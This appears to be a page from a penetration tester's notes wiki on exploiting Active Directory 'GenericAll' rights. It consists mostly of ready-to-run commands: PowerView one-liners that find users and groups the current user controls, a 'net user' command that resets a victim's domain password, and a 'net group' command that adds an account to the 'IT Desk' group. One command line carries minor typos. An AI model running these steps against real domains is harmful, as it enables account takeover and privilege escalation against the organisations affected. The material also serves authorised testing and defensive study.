# GenericAll

## <mark style="color:red;">GenericAll in Users</mark>

Find domain users that current user has `GenericAll` access right to:

```powershell
powerPowerView3 > Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | % {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | % {if ($_.Identity -eq $("$env:UserDomain\$env:UserName")) {$_}} ? {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

![](<../../../../.gitbook/assets/image (270).png>)

The attacker can change password of discovered users:

```powershell
Cmd > net user snovvcrash Passw0rd! /domain
```

## <mark style="color:red;">GenericAll on Groups</mark>

Find domain groups that current user has `GenericAll` access right to:

```powershell
PowerView3 > Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | % {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | % {if ($_.Identity -eq $("$env:UserDomain\$env:UserName")) {$_}} ? {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

The attacker can add users to discovered groups:

```
Cmd > net group "IT Desk" snovvcrash /add /domain
```
